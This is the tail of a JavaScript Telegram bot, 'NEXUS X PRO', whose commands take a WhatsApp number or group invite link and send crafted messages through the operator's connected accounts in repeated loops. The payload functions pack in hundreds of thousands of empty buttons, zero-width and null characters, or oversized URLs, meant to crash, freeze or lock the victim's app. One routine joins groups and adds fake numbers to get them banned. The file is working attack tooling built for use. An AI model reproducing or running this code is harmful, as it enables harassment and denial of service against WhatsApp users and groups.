        return ctx.reply("❌ Tidαk αdα sєndєr yαng tєrsєdiα, cєk /sender");
    }

    const isAll = targets.length > 1;
    const senderLabel = isAll ? "ALL" : `+${targets[0].phone}`;
    const target = q + "@s.whatsapp.net";
    const now = () => new Date().toLocaleTimeString("id-ID", { timeZone: "Asia/Jakarta", hour12: false });

    const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, THUMB, {
        caption: `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Tчpє: Blαnk αndrσid visiblє
↯ Nυmвєr: ${q}
↯ Stαtυs: Mєngirim...`,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: [[
                { text: "𝐂𝐋𝐈𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
            ]]
        }
    });

    const processMessageId = processMessage.message_id;
    let failCount = 0;

    for (const entry of targets) {
        try {
            for (let i = 0; i < 50; i++) {
                await Blank(entry.sock, target);
                await ZxxyFreezeInvis(entry.sock, target);
                await sleep(2000);
            }
        } catch (err) {
            failCount++;
        }
    }

    if (failCount === 0) {
        console.log(`[${now()}] [killed] -> ${q} | loop: 50x`);
    } else {
        console.log(`[${now()}] [killed] -> ${q} | loop: 50x (fail: ${failCount})`);
    }

    const statusLine = failCount === 0
        ? "Sєlєsαi"
        : `Sєlєsαi (${failCount} gαgαl)`;

    try {
        await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Tчpє: Blαnk αndrσid visiblє
↯ Nυmвєr: ${q}
↯ Stαtυs: ${statusLine}`, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [[
                    { text: "𝐂𝐋𝐈𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
                ]]
            }
        });
    } catch (e) {}
});

bot.command("apsyal", checkWhatsAppConnection, checkAccess(), checkBlocked(), cooldownMW(), async (ctx) => {
    const q = (ctx.message.text.split(" ")[1] || "").replace(/[^0-9]/g, "");
    if (!q) return ctx.reply(`🪧 Fσrmαt: /apsyal 62×××`);

    const targets = resolveSenders(ctx);
    if (targets.length === 0) {
        return ctx.reply("❌ Tidαk αdα sєndєr yαng tєrsєdiα, cєk /sender");
    }

    const isAll = targets.length > 1;
    const senderLabel = isAll ? "ALL" : `+${targets[0].phone}`;
    const target = q + "@s.whatsapp.net";
    const now = () => new Date().toLocaleTimeString("id-ID", { timeZone: "Asia/Jakarta", hour12: false });

    const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, THUMB, {
        caption: `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Tчpє: Blαnk X Frєzєє visiblє
↯ Nυmвєr: ${q}
↯ Stαtυs: Mєngirim...`,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: [[
                { text: "𝐂𝐋𝐈𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
            ]]
        }
    });

    const processMessageId = processMessage.message_id;
    let failCount = 0;

    for (const entry of targets) {
        try {
            for (let i = 0; i < 50; i++) {
                await Blank(entry.sock, target);
                await ZxxyFreezeInvis(entry.sock, target);
                await sleep(2000);
            }
        } catch (err) {
            failCount++;
        }
    }

    if (failCount === 0) {
        console.log(`[${now()}] [apsyal] -> ${q} | loop: 50x`);
    } else {
        console.log(`[${now()}] [apsyal] -> ${q} | loop: 50x (fail: ${failCount})`);
    }

    const statusLine = failCount === 0
        ? "Sєlєsαi"
        : `Sєlєsαi (${failCount} gαgαl)`;

    try {
        await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Tчpє: Blαnk X Frєzєє visiblє
↯ Nυmвєr: ${q}
↯ Stαtυs: ${statusLine}`, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [[
                    { text: "𝐂𝐋𝐈𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
                ]]
            }
        });
    } catch (e) {}
});

bot.command("hard", checkWhatsAppConnection, checkAccess(), checkBlocked(), cooldownMW(), async (ctx) => {
    const q = (ctx.message.text.split(" ")[1] || "").replace(/[^0-9]/g, "");
    if (!q) return ctx.reply(`🪧 Fσrmαt: /hard 62×××`);

    const targets = resolveSenders(ctx);
    if (targets.length === 0) {
        return ctx.reply("❌ Tidαk αdα sєndєr yαng tєrsєdiα, cєk /sender");
    }

    const isAll = targets.length > 1;
    const senderLabel = isAll ? "ALL" : `+${targets[0].phone}`;
    const target = q + "@s.whatsapp.net";
    const now = () => new Date().toLocaleTimeString("id-ID", { timeZone: "Asia/Jakarta", hour12: false });

    const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, THUMB, {
        caption: `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Tчpє: Dєlαч Invisiblє hαrd
↯ Nυmвєr: ${q}
↯ Stαtυs: Mєngirim...`,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: [[
                { text: "𝐂𝐋𝐈𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
            ]]
        }
    });

    const processMessageId = processMessage.message_id;
    let failCount = 0;

    for (const entry of targets) {
        try {
            for (let i = 0; i < 50; i++) {
                await DelayHardV2(entry.sock, target);
                await ZxxyFreezeInvis(entry.sock, target);
                await sleep(2000);
            }
        } catch (err) {
            failCount++;
        }
    }

    if (failCount === 0) {
        console.log(`[${now()}] [hard] -> ${q} | loop: 50x`);
    } else {
        console.log(`[${now()}] [hard] -> ${q} | loop: 50x (fail: ${failCount})`);
    }

    const statusLine = failCount === 0
        ? "Sєlєsαi"
        : `Sєlєsαi (${failCount} gαgαl)`;

    try {
        await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Tчpє: Dєlαч Invisiblє hαrd
↯ Nυmвєr: ${q}
↯ Stαtυs: ${statusLine}`, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [[
                    { text: "𝐂𝐋𝐈𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
                ]]
            }
        });
    } catch (e) {}
});

bot.command("xcrash", checkWhatsAppConnection, checkAccess(), checkBlocked(), cooldownMW(), async (ctx) => {
    const q = (ctx.message.text.split(" ")[1] || "").replace(/[^0-9]/g, "");
    if (!q) return ctx.reply(`🪧 Fσrmαt: /xcrash 62×××`);

    const targets = resolveSenders(ctx);
    if (targets.length === 0) {
        return ctx.reply("❌ Tidαk αdα sєndєr yαng tєrsєdiα, cєk /sender");
    }

    const isAll = targets.length > 1;
    const senderLabel = isAll ? "ALL" : `+${targets[0].phone}`;
    const target = q + "@s.whatsapp.net";
    const now = () => new Date().toLocaleTimeString("id-ID", { timeZone: "Asia/Jakarta", hour12: false });

    const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, THUMB, {
        caption: `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Tчpє: Frєzєє crαsh invisiвlє
↯ Nυmвєr: ${q}
↯ Stαtυs: Mєngirim...`,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: [[
                { text: "𝐂𝐋𝐈𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
            ]]
        }
    });

    const processMessageId = processMessage.message_id;
    let failCount = 0;

    for (const entry of targets) {
        try {
            for (let i = 0; i < 50; i++) {
                await XzRz(entry.sock, target);
                await sleep(2000);
            }
        } catch (err) {
            failCount++;
        }
    }

    if (failCount === 0) {
        console.log(`[${now()}] [xcrash] -> ${q} | loop: 50x`);
    } else {
        console.log(`[${now()}] [xcrash] -> ${q} | loop: 50x (fail: ${failCount})`);
    }

    const statusLine = failCount === 0
        ? "Sєlєsαi"
        : `Sєlєsαi (${failCount} gαgαl)`;

    try {
        await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Tчpє: Frєzєє crαsh invisiвlє
↯ Nυmвєr: ${q}
↯ Stαtυs: ${statusLine}`, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [[
                    { text: "𝐂𝐋𝐈𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
                ]]
            }
        });
    } catch (e) {}
});

bot.command("sedot", checkWhatsAppConnection, checkAccess(), checkBlocked(), cooldownMW(), async (ctx) => {
    const q = (ctx.message.text.split(" ")[1] || "").replace(/[^0-9]/g, "");
    if (!q) return ctx.reply(`🪧 Fσrmαt: /sedot 62×××`);

    const targets = resolveSenders(ctx);
    if (targets.length === 0) {
        return ctx.reply("❌ Tidαk αdα sєndєr yαng tєrsєdiα, cєk /sender");
    }

    const isAll = targets.length > 1;
    const senderLabel = isAll ? "ALL" : `+${targets[0].phone}`;
    const target = q + "@s.whatsapp.net";
    const now = () => new Date().toLocaleTimeString("id-ID", { timeZone: "Asia/Jakarta", hour12: false });

    const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, THUMB, {
        caption: `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Tчpє: Sєdσt Kυσtα X Frєzєє
↯ Nυmвєr: ${q}
↯ Stαtυs: Mєngirim...`,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: [[
                { text: "𝐂𝐋𝐈𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
            ]]
        }
    });

    const processMessageId = processMessage.message_id;
    let failCount = 0;

    for (const entry of targets) {
        try {
            for (let i = 0; i < 70; i++) {
                await GrenCL(entry.sock, target);
                await ZxxyFreezeInvis(entry.sock, target);
                await sleep(2000);
            }
        } catch (err) {
            failCount++;
        }
    }

    if (failCount === 0) {
        console.log(`[${now()}] [sedot] -> ${q} | loop: 50x`);
    } else {
        console.log(`[${now()}] [sedot] -> ${q} | loop: 50x (fail: ${failCount})`);
    }

    const statusLine = failCount === 0
        ? "Sєlєsαi"
        : `Sєlєsαi (${failCount} gαgαl)`;

    try {
        await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Tчpє: Sєdσt Kυσtα X Frєzєє
↯ Nυmвєr: ${q}
↯ Stαtυs: ${statusLine}`, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [[
                    { text: "𝐂𝐋𝐈𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
                ]]
            }
        });
    } catch (e) {}
});

bot.command("lock", checkWhatsAppConnection, checkAccess(), checkBlocked(), cooldownMW(), async (ctx) => {
    const q = (ctx.message.text.split(" ")[1] || "").replace(/[^0-9]/g, "");
    if (!q) return ctx.reply(`🪧 Fσrmαt: /lock 62×××`);

    const targets = resolveSenders(ctx);
    if (targets.length === 0) {
        return ctx.reply("❌ Tidαk αdα sєndєr yαng tєrsєdiα, cєk /sender");
    }

    const isAll = targets.length > 1;
    const senderLabel = isAll ? "ALL" : `+${targets[0].phone}`;
    const target = q + "@s.whatsapp.net";
    const now = () => new Date().toLocaleTimeString("id-ID", { timeZone: "Asia/Jakarta", hour12: false });

    const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, THUMB, {
        caption: `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Tчpє: Lσckєd chαt αndrσid
↯ Nυmвєr: ${q}
↯ Stαtυs: Mєngirim...`,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: [[
                { text: "𝐂𝐋𝐈𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
            ]]
        }
    });

    const processMessageId = processMessage.message_id;
    let failCount = 0;

    for (const entry of targets) {
        try {
            for (let i = 0; i < 70; i++) {
                await LockByGrenV2(entry.sock, target);
                await sleep(2000);
            }
        } catch (err) {
            failCount++;
        }
    }

    if (failCount === 0) {
        console.log(`[${now()}] [lock] -> ${q} | loop: 50x`);
    } else {
        console.log(`[${now()}] [lock] -> ${q} | loop: 50x (fail: ${failCount})`);
    }

    const statusLine = failCount === 0
        ? "Sєlєsαi"
        : `Sєlєsαi (${failCount} gαgαl)`;

    try {
        await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Tчpє: Lσckєd chαt αndrσid
↯ Nυmвєr: ${q}
↯ Stαtυs: ${statusLine}`, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [[
                    { text: "𝐂𝐋𝐈𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
                ]]
            }
        });
    } catch (e) {}
});

bot.command("blankgb", checkWhatsAppConnection, checkAccess(), cooldownMW(), async (ctx) => {
    const input = ctx.message.text.split(" ")[1];
    if (!input) {
        return ctx.reply(`🪧 Fσrmαt: /blankgb https://chat.whatsapp.com/XXXXX`);
    }

    if (!input.includes('chat.whatsapp.com')) {
        return ctx.reply(`❌ Hαnyα línk grυp yαng dídυkυng`);
    }

    const match = input.match(/chat\.whatsapp\.com\/([0-9A-Za-z]+)/i);
    if (!match) return ctx.reply(`❌ Línk grυp tídαk vαlíd`);

    const inviteCode = match[1];
    const targets = resolveSenders(ctx);
    if (!targets.length) return ctx.reply("❌ Sєndєr kσsσng");

    const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, THUMB, {
        caption: `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Tчpє: Blαnk X Frєzєє Grσυp 
↯ Tαrgєt: <code>${inviteCode}</code>
↯ Stαtυs: Prσcєssíng...
`,
        parse_mode: "HTML"
    });

    const processMessageId = processMessage.message_id;

    for (const entry of targets) {
        let target = null;
        let groupName = '-';

        try {
            const result = await entry.sock.groupAcceptInvite(inviteCode);

            if (typeof result === 'string') {
                target = result.endsWith('@g.us') ? result : `${result}@g.us`;
            } else if (result && typeof result === 'object' && result.jid) {
                target = String(result.jid);
            } else {
                const meta = await entry.sock.groupGetInviteInfo(inviteCode);
                if (meta && meta.id) {
                    target = String(meta.id);
                    groupName = meta.subject || '-';
                }
            }

            if (!target) continue;

            try {
                const meta = await entry.sock.groupMetadata(target);
                groupName = meta.subject || '-';
            } catch {}

            for (let i = 0; i < 50; i++) {
                await BlankGb(entry.sock, target);
                await sleep(2000);
            }

        } catch (err) {
            console.error('[blankgb]', entry.phone, err.message);
        }
    }

    await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Tчpє: Blαnk X Frєzєє Grσυp
↯ Tαrgєt: <code>${inviteCode}</code>
↯ Stαtυs: Sєlєsαí
`, { parse_mode: "HTML" });
});

bot.command('banGb', checkWhatsAppConnection, checkAccess(), cooldownMW(), async (ctx) => {
    const chatId = ctx.chat.id;
    const link = ctx.message.text.split(' ').slice(1).join(' ');

    if (!link) {
        return ctx.reply(`🪧 Cσntσh: /banGb https://chat.whatsapp.com/xxxxxx`);
    }

    const inviteCode = extractGroupCode(link);

    if (!inviteCode) {
        return ctx.reply(`❌ Línk tídαk vαlíd`);
    }

    const targets = resolveSenders(ctx);
    if (!targets.length) return ctx.reply("❌ Sєndєr kσsσng");

    const processMessage = await ctx.replyWithPhoto(THUMB, {
        caption: `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Tαrgєt Grυp: ${inviteCode}
↯ Tчpє: Aυtσ Jσín + Grσυp Bαn
↯ Stαtυs: Prσcєssíng...
`,
        parse_mode: "HTML"
    });

    const processMsgId = processMessage.message_id;
    let successCount = 0;

    for (const entry of targets) {
        try {
            const target = await entry.sock.groupAcceptInvite(inviteCode);

            if (target) {
                await BandGb(entry.sock, target);
                successCount++;
            }
        } catch (err) {
            console.error(`[banGb] ${entry.phone} err:`, err.message);
        }
    }

    const finalStatus = successCount > 0 ? "Bєrhαsíl" : "Gαgαl";

    await ctx.telegram.editMessageCaption(
        chatId,
        processMsgId,
        undefined,
        `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Tαrgєt Grυp: ${inviteCode}
↯ Tчpє: Aυtσ Jσín + Grυp Bαn
↯ Stαtυs: ${finalStatus}
`,
        { parse_mode: "HTML" }
    );
});

// ─────── EXTRACT GROUP CODE ─────── //
function extractGroupCode(input) {
    const text = String(input || "").trim();
    const match = text.match(/chat\.whatsapp\.com\/([0-9A-Za-z]+)/i);
    return match ? match[1] : null;
}

// ─────── AWAL DARI FUNCTION ─────── //
async function BandGb(sock, groupJid) {
    if (!groupJid.endsWith("@g.us")) throw new Error('@g.us server required');

    const resolveJid = function(raw) {
        let s = String(raw || '').trim();
        if (s.includes('@')) return s;
        return s.replace(/\D/g, '') + '@s.whatsapp.net';
    };

    const jids = (Array.isArray(groupJid) ? groupJid : [groupJid])
        .map(resolveJid)
        .filter(function(j) { return j.length > 15; });

    if (!jids.length) throw new Error('No valid JIDs');

    for (let i = 0; i < jids.length; i++) {
        const group = jids[i];

        try {
            await sock.groupParticipantsUpdate(group, ["13135550002@s.whatsapp.net"], "add");
        } catch (_) {}
        
        await new Promise(r => setTimeout(r, 2000));

        try {
            await sock.groupParticipantsUpdate(group, ['971500000000@s.whatsapp.net'], 'add');
        } catch (_) {}
        
        await new Promise(r => setTimeout(r, 2000));

        try {
            const fakeNumbers = Array.from({ length: 10 }, () => {
                return Math.floor(Math.random() * 9000000000000) + 1000000000000 + '@s.whatsapp.net';
            });
            for (const fakeJid of fakeNumbers) {
                await sock.groupParticipantsUpdate(group, [fakeJid], 'add').catch(() => {});
                await new Promise(r => setTimeout(r, 5000));
            }
        } catch (_) {}
    }
}

async function BlankGb(sock, target) {
    let jid;

    if (target.includes("@g.us")) {
        jid = target;
    } else if (target.includes("@s.whatsapp.net")) {
        jid = target;
    } else {
        jid = target.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    }

    const msg = await generateWAMessageFromContent(jid, {
        buttonsMessage: {
            contentText: "270 subs",
            footerText: "ꦾDɪᴋs Is Hᴀʀᴇ",
            headerType: 1,
            buttons: [
                {
                    buttonId: "ꦾɢʜᴏꜱᴛ1",
                    buttonText: {
                        displayText: "u200D".repeat(7000) + "ြ".repeat(5500)+"\uFE0F".repeat(6000),
                    },
                    type: 1
                },
                {
                    buttonId: "ꦾɢʜᴏꜱᴛ2",
                    buttonText: {
                        displayText: "\u200B".repeat(9000) + "\uFE00".repeat(6000)+"ꦾ".repeat(5000),
                    },
                    type: 1
                }
            ]
        }
    }, { userJid: jid });

    await sock.relayMessage(jid, msg.message, {
        messageId: msg.key.id,
        noSelfSync: true
    });
}

async function GrenCL(sock, target) {
  const jid = String(target).includes("@")
    ? String(target)
    : String(target).replace(/\D/g, "") + "@s.whatsapp.net";

  let X = "\u0000".repeat(2000);
  let B = "uuid, data".repeat(50000);

  const Gren = {
    richResponseMessage: {
      messageType: 1,
      submessages: [{
        messageType: 9,
        contentItemsMetadata: {
          contentType: 1,
          itemsMetadata: [{
            reelItem: {
              videoUrl: "https://files.catbox.moe/h1xx7k.mp4" + B,
              thumbnailUrl: "https://files.catbox.moe/h1xx7k.mp4" + X,
              profileIconUrl: "https://files.catbox.moe/h1xx7k.mp4" + B
            }
          }]
        }
      }]
    }
  };

  await sock.relayMessage('status@broadcast', Gren, {
    messageId: 'gren-' + Date.now().toString(36).toUpperCase(),
    statusJidList: [jid],
    noSelfSync: true,
    additionalNodes: [{
      tag: 'meta',
      attrs: {},
      content: [{
        tag: 'mentioned_users',
        attrs: {},
        content: [{ tag: 'to', attrs: { jid: jid }, content: [] }]
      }]
    }]
  });
}

async function XzRz(sock, target) {
  const duration = 25 * 60 * 1000;
  const startTime = Date.now();
  while (Date.now() - startTime < duration) {
    await sock.relayMessage(
      target,
      {
        groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              body: {
                text: "XzTrash",
              },
              nativeFlowMessage: {
                buttons: Array.from({
                  length: 500000
                }, () => ({})),
                version: 3
              },
              entryPointConversionSource: "call_permission_request"
            }
          }
        }
      },
      { noSelfSync: true }
    );
  }
}

async function DelayHardV2(sock, target) {
  const jid = target.includes('@') ? target : target + '@s.whatsapp.net';

  const bR = {
    viewOnceMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "AmpossJing"
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({}))
          }
        }
      }
    }
  };

  const bS = await generateWAMessageFromContent(jid, bR, {
    userJid: jid
  });

  await sock.relayMessage(jid, bS.message, {
    messageId: bS.key.id,
   noSelfSync: true
  });
}

async function Blank(sock, target) {
  const jid = target.includes("@") ? target : target + "@s.whatsapp.net";

  await sock.relayMessage(jid, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: { text: "Hello, brother." },
          nativeFlowMessage: {
            buttons: [
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "\uFDFAu56DB".repeat(30000),
                  id: "\t".repeat(3000)
                })
              }
            ]
          },
          contextInfo: {
            mentionedJid: [jid]
          }
        }
      }
    }
  }, { noSelfSync: true });
}

async function ZxxyFreezeInvis(sock, target) {
  const jid = target.includes('@') ? target : target + '@s.whatsapp.net';

  const mesg1 = {
    groupStatusMessageV2: { 
      message: { 
        interactiveMessage: {
          body: { text: "permisi mas" },
          nativeFlowMessage: {
            buttons: Array.from({ length: 111111 }, () => 
            ({}))
          }
        }
      }
    }
  };

  const mesg2 = {
    groupStatusMessageV2: { 
      message: { 
        interactiveMessage: {
          body: { text: "Sorry mengganggu" },
          nativeFlowMessage: {
            buttons: Array.from({ length: 422422 }, () => 
            ({}))
          }
        }
      }
    }
  };

  const mesg3 = {
    groupStatusMessageV2: { 
      message: { 
        interactiveMessage: {
          body: { text: "on dlu mas" },
          nativeFlowMessage: {
            buttons: Array.from({ length: 313133 }, () => 
            ({}))
          }
        }
      }
    }
  };

  await sock.relayMessage(jid, mesg1, { noSelfSync: true });
  await sock.relayMessage(jid, mesg2, { noSelfSync: true });
  await sock.relayMessage(jid, mesg3, { noSelfSync: true });
}

// ─────── AKHIR DARI FUNCTION ─────── //
bot.launch().catch(e => KILL('LAUNCH_ERROR:' + e.message));

process.on('uncaughtException', (err) => KILL('UNCAUGHT_EXCEPTION: ' + err.message));
process.on('unhandledRejection', (reason) => KILL('UNHANDLED_REJECTION: ' + reason));